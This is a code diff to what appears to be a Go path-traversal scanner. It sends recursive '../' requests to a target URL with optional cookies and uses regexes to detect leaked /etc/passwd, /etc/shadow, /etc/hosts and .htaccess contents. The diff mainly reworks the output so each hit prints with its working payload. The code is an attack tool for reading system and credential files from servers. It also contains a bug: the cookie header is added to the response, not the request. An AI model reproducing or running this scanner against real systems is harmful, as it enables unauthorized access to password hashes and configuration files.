@@ -105,8 +105,6 @@ var filesPattern = []string{
 
 func sendRequests(url string, cookies string) string {
 
-	fmt.Println("[+] Sending request to: ", url)
-
 	resp, err := http.Get(url)
 	resp.Header.Add("Cookie", cookies)
 	if err != nil {
@@ -157,14 +155,20 @@ func main() {
 	goin := flag.Int("goin", 3, "max of recursive ../../../ default: 3")
 	flag.Parse()
 
-	fmt.Println("URL: ", *url)
-	fmt.Println("EndPoint: ", *endPoint)
-	fmt.Println("Cookies: ", *cookies)
-	fmt.Println("Goin: ", *goin)
-
+	// checking inputs
 	validateInput(*url, *endPoint)
 	validateURL(*url)
 	validateURLendPoints(*url, *endPoint)
+
+	// info prints
+	fmt.Println("[+]TARGET: ", utils.SetColorBlue(*url))
+	fmt.Println("[+]ENDPOINT SET: ", utils.SetColorBlue(*endPoint))
+	fmt.Println("[+]DEPH SET: ", *goin)
+	if *cookies != "" {
+		fmt.Println("[+]ENDPOINT SET: ", utils.SetColorBlue(*cookies))
+	}
+
+	fmt.Println(utils.SetColorYela("[+] INIT REQUESTS [+]"))
 
 	// regex to find
 	etcPasswd := regexp.MustCompile(`root:(.*)\s\w(.*)`)
@@ -186,22 +190,23 @@ func main() {
 					// hell if's to make sure that pattern is finding :)
 					matchEtcPasswd := etcPasswd.FindStringSubmatch(response)
 					if len(matchEtcPasswd) != 0 {
-						fmt.Printf("---> [+] ETC/PASSWD FOUND: %s\n", matchEtcPasswd[1])
+						fmt.Printf(utils.SetColorGreen("---> [+] ETC/PASSWD FOUND: %s\n payload: %s \n\n"), matchEtcPasswd[1], requestPattern)
+
 					}
 
 					matchEtcHosts := etcHosts.FindStringSubmatch(response)
 					if len(matchEtcHosts) != 0 {
-						fmt.Printf("---> [+] ETC/HOSTS: %s\n", matchEtcHosts[1])
+						fmt.Printf("---> [+] ETC/HOSTS: %s\n payload: %s \n\n", matchEtcHosts[1], requestPattern)
 					}
 
 					matchHtAcess := htAcess.FindStringSubmatch(response)
 					if len(matchHtAcess) != 0 {
-						fmt.Printf("---> [+] HTACESS FOUND: %s\n", matchHtAcess[1])
+						fmt.Printf("---> [+] HTACESS FOUND: %s\n payload: %s\n\n", matchHtAcess[1], requestPattern)
 					}
 
 					matchShadow := etcShadow.FindStringSubmatch(response)
 					if len(matchShadow) != 0 {
-						fmt.Printf("---> [+] ETC/SHADOW FOUND: %s\n", matchShadow[1])
+						fmt.Printf("---> [+] ETC/SHADOW FOUND: %s\n payload: %s\n\n", matchShadow[1], requestPattern)
 					}
 
 				}
